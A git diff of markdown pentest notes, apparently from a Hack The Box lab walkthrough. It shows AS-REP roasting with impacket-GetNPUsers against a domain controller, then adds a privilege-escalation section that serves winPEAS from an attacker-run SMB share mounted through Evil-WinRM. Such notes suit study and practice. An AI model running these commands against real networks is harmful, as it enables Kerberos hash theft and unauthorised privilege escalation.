@@ -201,7 +201,7 @@ rpcclient $> querygroup 0x47c
 
 ## AS-REP Roasting
 ### Get Hash
-- `impacket-GetNPUsers`: Get users who not require Kerberos preauthentication.
+  - `impacket-GetNPUsers`: Get users who not require Kerberos preauthentication.
 ```CSS
 ▶ impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt
 ```
@@ -223,3 +223,17 @@ rpcclient $> querygroup 0x47c
 ```
 ![image](https://user-images.githubusercontent.com/83878909/231141723-17ad9489-509d-4273-a5a8-3528bdaf934f.png)
 
+---
+
+## Privilege Escalation
+### WinPEAS
+  - Setup drive to run `winPEASx64.exe`
+``` CSS
+▶ impacket-smbserver pwnshare $(pwd) -smb2support -user random -password passwd
+```
+
+```CSS
+*Evil-WinRM* PS C:\> $pass = convertto-securestring 'passwd' -AsPlainText -Force
+*Evil-WinRM* PS C:\> $cred = New-Object System.Management.Automation.PSCredential('random', $pass)
+*Evil-WinRM* PS C:\> New-PSDrive -Name pwndrive -PSProvider FileSystem -Credential $cred -Root \\10.10.14.28\pwnshare
+```
